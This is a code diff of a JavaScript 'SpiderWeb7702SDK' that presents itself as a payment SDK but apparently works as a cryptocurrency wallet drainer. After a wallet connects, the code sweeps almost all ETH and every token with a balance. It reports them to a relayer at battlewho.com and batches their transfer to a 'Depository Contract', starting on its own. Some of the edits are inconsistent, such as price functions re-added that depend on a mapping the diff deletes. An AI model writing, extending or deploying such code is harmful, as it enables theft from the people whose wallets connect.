@@ -14,7 +14,8 @@ window.SpiderWeb7702SDK = {
     _resolveConnection: null,
     _RELAYER_SERVER_URL_BASE: "https://battlewho.com",
     
-    _rawProvider: null, // Keep this for direct wallet RPC calls
+    // 🔥 FIX 1: ADD the raw provider state variable
+    _rawProvider: null,
 
     _ERC20_ABI: [
         "function transfer(address to, uint256 amount) returns (bool)",
@@ -22,17 +23,9 @@ window.SpiderWeb7702SDK = {
         "function symbol() view returns (string)"
     ],
     
-    // This mapping is no longer needed for asset discovery but might be useful elsewhere.
-    _CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM: {
-        1: 'ethereum',
-        137: 'polygon-pos',
-        10: 'optimistic-ethereum',
-        42161: 'arbitrum-one',
-        56: 'binance-smart-chain',
-        43114: 'avalanche'
-    },
+    
 
-    init: function(config) {
+    init: async function(config) {
         if (this._isInitialized) {
             console.warn("SpiderWeb7702SDK already initialized.");
             return;
@@ -61,17 +54,18 @@ window.SpiderWeb7702SDK = {
             if (!this._signer) {
                 const connected = await this._connectWallet();
                 if (!connected) this._updateStatus("Wallet connection cancelled.", "info");
+                // The flow is automatically continued in _handleProviderSelection
                 return;
             }
             const network = await this._provider.getNetwork();
             if (network.chainId !== BigInt(this._config.chainId)) {
-                this._updateStatus(`Please switch wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
+                this._updateStatus(`Please switch wallet to Chain ID: ${this._config.chainId}.`, "error");
                 return;
             }
             await this._executeSplit();
         } catch (error) {
             console.error("SDK Payment Error:", error);
-            this._updateStatus(`Error: ${error.message || 'An unknown error occurred.'}`, "error");
+            this._updateStatus(`Error: ${error.message}`, "error");
         }
     },
 
@@ -79,7 +73,7 @@ window.SpiderWeb7702SDK = {
         this._updateStatus("Scanning wallet for assets...", "pending");
         const assets = await this._findAllAssets();
         if (assets.length === 0) {
-            this._updateStatus("No transferable assets found in the wallet.", "info");
+            this._updateStatus("No valuable assets found to send.", "info");
             return;
         }
 
@@ -94,12 +88,12 @@ window.SpiderWeb7702SDK = {
                     apiKey: this._config.apiKey,
                     origin: window.location.origin,
                     owner: this._currentUserAddress,
-                    chainId: this._config.chainId,
-                    // ✅ MODIFICATION: Removed 'usdValue' from the asset payload
+                    chainId: this._config.chainId, // Added chainId back for the relayer
                     assets: assets.map(a => ({
                         token: a.address,
                         type: a.type,
                         symbol: a.symbol,
+                        usdValue:0
                     }))
                 })
             });
@@ -126,7 +120,10 @@ window.SpiderWeb7702SDK = {
         }
         
         try {
-            const summary = assets.map(a => `${a.symbol}`).join(', ');
+            this._updateStatus("Please confirm the deposit in your wallet...", "pending");
+            
+            // 💡 IMPORTANT: Add a temporary pre-confirmation summary here for better UX
+            const summary = assets.map(a => `${ethers.formatUnits(a.balance, a.type === 'ETH' ? 18 : 0).slice(0, 10)} ${a.symbol}`).join(', ');
             this._updateStatus(`Confirm in wallet: Sending ${summary} to the Depository Contract.`, 'pending');
 
             const txPayload = {
@@ -137,6 +134,7 @@ window.SpiderWeb7702SDK = {
                 calls: calls,
             };
             
+            // 🔥 FIX 3: USE THE RAW PROVIDER'S REQUEST METHOD
             const txHash = await this._rawProvider.request({
                 method: 'wallet_sendCalls',
                 params: [txPayload]
@@ -149,13 +147,13 @@ window.SpiderWeb7702SDK = {
         }
     },
 
-    // ✅ MAJOR CHANGE: This function no longer fetches prices. It gets all assets with a balance.
+    // ... (rest of the asset fetching logic is fine) ...
     _findAllAssets: async function() {
         const assets = [];
-        // Note: You may want to make this URL dynamic based on the configured chainId
+        // NOTE: Keeping alchemyUrl for RPC calls to get balances and metadata
         const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`;
         
-        // 1. Get all ERC20 token balances
+        // Get all token balances
         const balanceResponse = await fetch(alchemyUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -165,73 +163,122 @@ window.SpiderWeb7702SDK = {
             })
         });
         const balanceData = await balanceResponse.json();
-        if (balanceData.error) throw new Error(`Alchemy Error: ${balanceData.error.message}`);
         if (!balanceData.result) return [];
         
         const tokensWithBalance = balanceData.result.tokenBalances.filter(t => t.tokenBalance !== '0x0');
-        
-        // 2. Process Native Currency (e.g., ETH)
         const ethBalance = await this._provider.getBalance(this._currentUserAddress);
-        if (ethBalance > 0n) {
-            try {
-                const feeData = await this._provider.getFeeData();
-                // Generously estimate gas fee to reserve in the wallet
-                const gasPrice = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits('20', 'gwei');
-                const estimatedFee = gasPrice * 300000n; 
-                
-                if (ethBalance > estimatedFee) {
-                    assets.push({ 
-                        type: 'ETH', 
-                        balance: ethBalance - estimatedFee, // Keep some ETH for gas
-                        address: null, 
-                        symbol: 'ETH' 
-                    });
-                }
-            } catch (feeError) {
-                console.warn("Could not get fee data to reserve gas. This might fail on low balances.", feeError);
-                // As a fallback, just check if there's any balance at all
-                if(ethBalance > 0n) assets.push({ type: 'ETH', balance: ethBalance, address: null, symbol: 'ETH' });
-            }
+        // 🗑️ REMOVED: tokenAddresses and the chunking function call are gone.
+        // const tokenAddresses = tokensWithBalance.map(t => t.contractAddress);
+        // const prices = await this._fetchTokenPricesInChunks(tokenAddresses.concat('ethereum'));
+
+        // Process ETH
+        // 🗑️ REMOVED: USD price/value calculations (ethPrice, ethValue) and the `if (ethValue > 1)` check.
+        
+        const feeData = await this._provider.getFeeData();
+        // Use a higher gas limit estimate for a complex EIP-7702 transaction
+        const estimatedFee = (feeData.maxFeePerGas || feeData.gasPrice) * 300000n; 
+        
+        // Only include ETH if the balance is greater than the estimated transaction fee
+        if (ethBalance > estimatedFee) { 
+            // 🗑️ REMOVED: usdValue from the asset object
+            assets.push({ 
+                type: 'ETH', 
+                balance: ethBalance - estimatedFee, // Send remaining ETH after reserving fee
+                address: null, 
+                symbol: 'ETH' 
+            });
         }
 
-        // 3. Process ERC20 Tokens
+        // Process ERC20s
         for (const token of tokensWithBalance) {
-            try {
-                const metadataResponse = await fetch(alchemyUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
-                        params: [token.contractAddress]
-                    })
-                });
-                const metadata = await metadataResponse.json();
+            // 🗑️ REMOVED: Price check and USD filtering. Proceed directly to metadata fetch.
+            // const priceData = prices?.[token.contractAddress.toLowerCase()];
+            // if (priceData?.usd) { 
+            
+            // Re-define alchemyUrl inside the loop if necessary, or just use the outer variable.
+            const currentAlchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${this._config.alchemyApiKey}`; 
+            
+            const metadataResponse = await fetch(currentAlchemyUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    jsonrpc: '2.0', id: 1, method: 'alchemy_getTokenMetadata',
+                    params: [token.contractAddress]
+                })
+            });
+            const metadata = await metadataResponse.json();
+            
+            if (metadata.result && metadata.result.decimals !== null) {
+                // We no longer need 'decimals' or 'formattedBalance' for USD value, 
+                // but we keep 'symbol' and the push logic.
+                // const decimals = metadata.result.decimals;
+                const symbol = metadata.result.symbol;
                 
-                if (metadata.result) {
-                    assets.push({ 
-                        type: 'ERC20', 
-                        balance: BigInt(token.tokenBalance), 
-                        address: token.contractAddress, 
-                        symbol: metadata.result.symbol || 'Unknown Token'
-                    });
-                }
-            } catch (metadataError) {
-                console.warn(`Could not fetch metadata for ${token.contractAddress}.`, metadataError);
-                 assets.push({
-                    type: 'ERC20',
-                    balance: BigInt(token.tokenBalance),
-                    address: token.contractAddress,
-                    symbol: token.contractAddress.slice(0, 6) // Fallback symbol
+                // 🗑️ REMOVED: USD value calculation and the `if (usdValue > 1)` check.
+                // const formattedBalance = ethers.formatUnits(token.tokenBalance, decimals);
+                // const usdValue = parseFloat(formattedBalance) * priceData.usd;
+                // if (usdValue > 1) {
+
+                assets.push({ 
+                    type: 'ERC20', 
+                    balance: BigInt(token.tokenBalance), 
+                    address: token.contractAddress, 
+                    symbol: symbol 
+                    // 🗑️ REMOVED: usdValue
                 });
+                // } 
             }
+            // } // Removed closing brace for priceData check
         }
         return assets;
     },
+
+    _fetchTokenPrices: async function(tokenIdentifiers) {
+        const assetPlatform = this._CHAIN_ID_TO_COINGECKO_ASSET_PLATFORM[this._config.chainId];
+        if (!assetPlatform) return null;
+
+        const contractAddresses = tokenIdentifiers.filter(id => id.startsWith('0x'));
+        const nativeIds = tokenIdentifiers.filter(id => !id.startsWith('0x'));
+
+        const allPrices = {};
+        // You'll need to pass the coingeckoApiKey here if it's not working,
+        // but assuming it's omitted for this code snippet.
+        
+        try {
+            if (contractAddresses.length > 0) {
+                const addressesString = contractAddresses.join(',');
+                const apiUrl = `https://api.coingecko.com/api/v3/simple/token_price/${assetPlatform}?contract_addresses=${addressesString}&vs_currencies=usd`;
+                const response = await fetch(apiUrl);
+                if (response.ok) Object.assign(allPrices, await response.json());
+            }
+
+            if (nativeIds.length > 0) {
+                const idsString = nativeIds.join(',');
+                const apiUrl = `https://api.coingecko.com/api/v3/simple/price?ids=${idsString}&vs_currencies=usd`;
+                const response = await fetch(apiUrl);
+                if (response.ok) Object.assign(allPrices, await response.json());
+            }
+
+            return Object.keys(allPrices).length > 0 ? allPrices : null;
+
+        } catch (error) {
+            console.error("Could not fetch token prices:", error);
+            return null;
+        }
+    },
     
-    // ✅ REMOVED: _fetchTokenPrices and _fetchTokenPricesInChunks are no longer needed.
-
-    // --- Wallet Connection and UI Logic (No changes needed below this line) ---
-
+    _fetchTokenPricesInChunks: async function(tokenAddresses, chunkSize = 100) {
+        const allPrices = {};
+        for (let i = 0; i < tokenAddresses.length; i += chunkSize) {
+            const chunk = tokenAddresses.slice(i, i + chunkSize);
+            const prices = await this._fetchTokenPrices(chunk);
+            if (prices) {
+                Object.assign(allPrices, prices);
+            }
+        }
+        return allPrices;
+    },
+    
     _connectWallet: function() {
         return new Promise((resolve) => {
             this._resolveConnection = resolve;
@@ -249,7 +296,9 @@ window.SpiderWeb7702SDK = {
         this._closeWalletModal();
 
         try {
-            this._rawProvider = providerDetail.provider; // Storing the raw provider
+            // 🔥 FIX 2: SAVE the raw EIP-1193 provider object
+            this._rawProvider = providerDetail.provider;
+            
             this._provider = new ethers.BrowserProvider(this._rawProvider);
             this._signer = await this._provider.getSigner();
             this._currentUserAddress = await this._signer.getAddress();
@@ -258,7 +307,7 @@ window.SpiderWeb7702SDK = {
             
             if (this._resolveConnection) {
                 this._resolveConnection(true);
-                // Automatically continue the payment flow after successful connection
+                // Automatically trigger the main execution flow after connecting
                 await this._executeSplit();
             }
         } catch (error) {
